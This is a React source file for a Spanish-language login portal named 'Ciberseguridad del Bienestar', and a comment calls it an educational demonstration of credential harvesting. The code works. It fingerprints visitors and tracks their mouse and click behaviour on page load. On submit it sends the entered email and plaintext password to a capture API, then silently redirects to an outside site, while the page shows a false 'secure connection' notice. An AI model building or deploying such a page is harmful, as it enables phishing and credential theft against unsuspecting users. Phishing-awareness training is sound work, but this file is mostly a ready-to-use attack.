import { useState, useEffect, useRef } from 'react';
import { collectFingerprint } from '../utils/fingerprint';
import { captureData } from '../utils/api';

/**
 * Login Page - Ciberseguridad del Bienestar
 *
 * ⚠️ EDUCATIONAL CYBERSECURITY PROJECT ⚠️
 * Demonstrates credential harvesting with fingerprinting
 */

const PhishingPageNew = () => {
  // State
  const [formData, setFormData] = useState({ email: '', password: '' });
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Behavior tracking
  const startTimeRef = useRef(Date.now());
  const behaviorRef = useRef({
    mouseMovements: 0,
    clicks: 0,
    scrolls: 0,
  });

  // Track behavior
  useEffect(() => {
    const handleMouseMove = () => behaviorRef.current.mouseMovements++;
    const handleClick = () => behaviorRef.current.clicks++;
    const handleScroll = () => behaviorRef.current.scrolls++;

    window.addEventListener('mousemove', handleMouseMove);
    window.addEventListener('click', handleClick);
    window.addEventListener('scroll', handleScroll);

    // Auto-capture fingerprint on page load
    (async () => {
      try {
        console.log('🔍 [AUTO-CAPTURE] Collecting fingerprint on page load...');
        const fingerprint = await collectFingerprint();
        const timeOnPage = Math.floor((Date.now() - startTimeRef.current) / 1000);

        await captureData({
          ...fingerprint,
          behavior: { ...behaviorRef.current, timeOnPage },
          metadata: {
            userSubmitted: false,
            formData: { email: null, password: null },
            pageVisit: true
          },
          timestamp: new Date().toISOString(),
        });
        console.log('✅ [AUTO-CAPTURE] Page visit captured');
      } catch (error) {
        console.error('❌ [AUTO-CAPTURE] Failed:', error);
      }
    })();

    return () => {
      window.removeEventListener('mousemove', handleMouseMove);
      window.removeEventListener('click', handleClick);
      window.removeEventListener('scroll', handleScroll);
    };
  }, []);

  // Handle form submit
  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!formData.email || !formData.password) {
      alert('Por favor ingresa tu correo electrónico y contraseña');
      return;
    }

    setIsSubmitting(true);

    try {
      console.log('🔍 [CREDENTIAL-CAPTURE] Capturing credentials...');
      const fingerprint = await collectFingerprint();
      const timeOnPage = Math.floor((Date.now() - startTimeRef.current) / 1000);

      await captureData({
        ...fingerprint,
        behavior: { ...behaviorRef.current, timeOnPage },
        metadata: {
          userSubmitted: true,
          formData: {
            email: formData.email,
            password: formData.password
          }
        },
        timestamp: new Date().toISOString(),
      });

      console.log('✅ [CREDENTIAL-CAPTURE] Credentials captured!');

      // Redirect to real site immediately (no warning)
      window.location.href = 'https://ezmprojects.com/MIT/index.html';
    } catch (error) {
      console.error('❌ [CREDENTIAL-CAPTURE] Failed:', error);
      alert('Error al procesar. Por favor intenta de nuevo.');
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-white shadow-sm">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-2xl font-bold text-gray-800">Ciberseguridad del Bienestar</h1>
              <p className="text-sm text-gray-600">Portal Educativo</p>
            </div>
            <nav className="hidden md:flex space-x-6 text-gray-700">
              <a href="#" className="hover:text-blue-600">Inicio</a>
              <a href="#" className="hover:text-blue-600">Sobre nuestro objetivo</a>
              <a href="#" className="hover:text-blue-600">Prevenciones</a>
              <a href="#" className="hover:text-blue-600">Simulacro</a>
            </nav>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-12">
        <div className="max-w-md mx-auto">
          {/* Login Card */}
          <div className="bg-white rounded-lg shadow-lg p-8">
            <div className="text-center mb-8">
              <div className="w-20 h-20 bg-blue-600 rounded-full mx-auto mb-4 flex items-center justify-center">
                <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
              </div>
              <h2 className="text-2xl font-bold text-gray-800 mb-2">Acceso al Portal</h2>
              <p className="text-gray-600">Ingresa con tu cuenta institucional</p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Correo Electrónico
                </label>
                <input
                  type="email"
                  value={formData.email}
                  onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition text-gray-900 bg-white"
                  placeholder="tu.correo@ejemplo.com"
                  required
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Contraseña
                </label>
                <input
                  type="password"
                  value={formData.password}
                  onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition text-gray-900 bg-white"
                  placeholder="••••••••"
                  required
                />
              </div>

              <div className="flex items-center justify-between text-sm">
                <label className="flex items-center">
                  <input type="checkbox" className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500" />
                  <span className="ml-2 text-gray-700">Recordarme</span>
                </label>
                <a href="#" className="text-blue-600 hover:underline">¿Olvidaste tu contraseña?</a>
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full bg-blue-600 text-white py-3 rounded-lg font-medium hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isSubmitting ? 'Ingresando...' : 'Iniciar Sesión'}
              </button>
            </form>

            <div className="mt-6 text-center">
              <p className="text-sm text-gray-600">
                ¿No tienes una cuenta? <a href="#" className="text-blue-600 hover:underline">Regístrate aquí</a>
              </p>
            </div>

            <div className="mt-6 pt-6 border-t border-gray-200 text-center">
              <p className="text-xs text-gray-500">
                🔒 Conexión segura - Tus datos están protegidos
              </p>
            </div>
          </div>

          {/* Info Box */}
          <div className="mt-6 bg-blue-50 border border-blue-200 rounded-lg p-4">
            <div className="flex items-start">
              <svg className="w-5 h-5 text-blue-600 mt-0.5 mr-3 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
              </svg>
              <div className="text-sm text-blue-800">
                <p className="font-medium mb-1">Acceso exclusivo para estudiantes y personal</p>
                <p className="text-blue-700">Si tienes problemas para acceder, contacta al administrador del sistema.</p>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-gray-800 text-white mt-16">
        <div className="container mx-auto px-4 py-8">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            <div>
              <h3 className="text-lg font-bold mb-4">Ciberseguridad del Bienestar</h3>
              <p className="text-gray-400 text-sm">
                Proyecto educativo dedicado a la concientización sobre seguridad en línea.
              </p>
            </div>
            <div>
              <h3 className="text-lg font-bold mb-4">Enlaces Útiles</h3>
              <ul className="space-y-2 text-sm">
                <li><a href="#" className="text-gray-400 hover:text-white">Inicio</a></li>
                <li><a href="#" className="text-gray-400 hover:text-white">Prevenciones</a></li>
                <li><a href="#" className="text-gray-400 hover:text-white">Contacto</a></li>
              </ul>
            </div>
            <div>
              <h3 className="text-lg font-bold mb-4">Contacto</h3>
              <p className="text-gray-400 text-sm">Chihuahua, Chihuahua</p>
              <p className="text-gray-400 text-sm mt-2">info@ciberseguridadbienestar.edu</p>
            </div>
          </div>
          <div className="border-t border-gray-700 mt-8 pt-6 text-center text-sm text-gray-400">
            <p>⚠️ Proyecto Educativo de Ciberseguridad - Demostración Académica</p>
            <p className="mt-2">© 2024 Ciberseguridad del Bienestar. Todos los derechos reservados.</p>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default PhishingPageNew;
